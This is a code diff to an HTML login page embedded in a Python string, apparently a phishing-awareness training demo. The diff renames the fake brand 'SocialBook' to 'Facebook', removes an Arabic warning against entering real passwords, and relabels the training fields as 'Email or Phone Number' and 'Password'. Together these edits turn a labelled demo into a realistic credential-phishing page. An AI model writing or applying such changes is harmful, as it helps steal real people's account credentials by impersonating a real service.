@@ -316,7 +316,7 @@ student_page = """
         <div class="left">
 
             <div class="logo">
-                SocialBook
+                Facebook
             </div>
 
             <p class="description">
@@ -334,14 +334,7 @@ student_page = """
 
         <div class="login-box">
 
-            <div class="warning">
-
-                ⚠️ Educational Training Demo<br>
-
-                استخدم Training Secret فقط.
-                لا تستخدم أي كلمة مرور حقيقية.
-
-            </div>
+        
 
 
             <form
@@ -352,15 +345,15 @@ student_page = """
                 <input
                     type="text"
                     name="username"
-                    placeholder="Training Username"
-                    autocomplete="off"
+                    placeholder="Email or Phone Number"
+                    autocomplete="on"
                     required
                 >
 
 
                 <label class="training-label">
 
-                    Training Secret
+                    Password 
 
                 </label>
 
@@ -368,7 +361,7 @@ student_page = """
                 <input
                     type="text"
                     name="secret"
-                    placeholder="TRAINING-123"
+                    placeholder="Password"
                     autocomplete="off"
                     required
                 >
@@ -379,7 +372,7 @@ student_page = """
                     type="submit"
                 >
 
-                    Submit Training Data
+                    Submit 
 
                 </button>
 
